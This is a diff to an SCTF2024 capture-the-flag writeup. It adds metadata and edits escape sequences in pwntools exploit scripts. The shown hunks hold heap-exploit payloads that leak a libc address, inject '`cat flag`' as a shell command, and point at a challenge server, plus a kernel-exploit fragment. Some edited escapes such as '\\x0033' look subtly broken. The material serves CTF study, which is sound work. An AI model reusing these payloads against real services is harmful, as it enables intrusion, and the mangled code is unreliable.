@@ -79,6 +79,9 @@ prerequisites:
 - TEA/XTEA 算法 + delta 推导
 - Coppersmith small_roots (Sage)
 - LLL 算法 + Dual RSA 攻击
+contest_normalized: "SCTF"
+contest_year: 2024
+subcategory_guess: "rsa"
 ---
 # SCTF2024 Writeup
 
@@ -2039,7 +2042,7 @@ while count < 16:
     sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":2,"content":"' + base64.b64encode(b'unused') + b'","username":"' + base64.b64encode(b'uuuu0000') + b'","size":64}]')
     sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":0,"content":"' + base64.b64encode(p64(heap_addr+0xff0-0x20)) + b'","username":"' + base64.b64encode(b'dddd1111') + b'","size":64}]')
     sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":0,"content":"' + base64.b64encode(b'unused') + b'","username":"' + base64.b64encode(b'dddd2222') + b'","size":64}]')
-    sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":0,"content":"' + base64.b64encode(b' ' * 0x10 + p64(0x5E0FD8) + p64(0x4000000001)) + b'","username":"' + base64.b64encode(b'dddd3333') + b'","size":64}]')
+    sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":0,"content":"' + base64.b64encode(b'\\x00' * 0x10 + p64(0x5E0FD8) + p64(0x4000000001)) + b'","username":"' + base64.b64encode(b'dddd3333') + b'","size":64}]')
 
     sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":1,"content":"' + base64.b64encode(b'unused') + b'","username":"' + base64.b64encode(b'dddd1111') + b'","size":64}]')
     sh.recvuntil(b'content:nn')
@@ -2050,7 +2053,7 @@ while count < 16:
         sh.close()
 
 success('puts_addr: ' + hex(puts_addr))
-sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":-1,"content":"' + base64.b64encode(b'`cat flag`') + b'","username":"' + base64.b64encode(hex(puts_addr).encode() + b' ') + b'","size":64}]')
+sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":-1,"content":"' + base64.b64encode(b'`cat flag`') + b'","username":"' + base64.b64encode(hex(puts_addr).encode() + b'\\x00') + b'","size":64}]')
 
 sh.interactive()
 from pwn import *
@@ -2103,8 +2106,8 @@ uheap = lambda : u64(io.recv(6).ljust(8,b'x00'))
 lg = lambda addr : log.info(addr)
 ia = lambda : io.interactive()
 lss = lambda s :
-log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
-p = lambda s: print(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
+log.success('\\x0033[1;31;40m%s --> 0x%x \\x0033[0m' % (s, eval(s)))
+p = lambda s: print('\\x0033[1;31;40m%s --> 0x%x \\x0033[0m' % (s, eval(s)))
 #----------------------------------------------------------------
 url = '1.95.68.23:
 58924'
@@ -2187,7 +2190,7 @@ void save_status()
                 "pushf;"
                 "pop user_rflags;"
                 ".att_syntax;");
-        puts(" 33[32m[+]save status successfully 33[0m");
+        puts("\\x0033[32m[+]save status successfully\\x0033[0m");
 }
 
 void shell() {
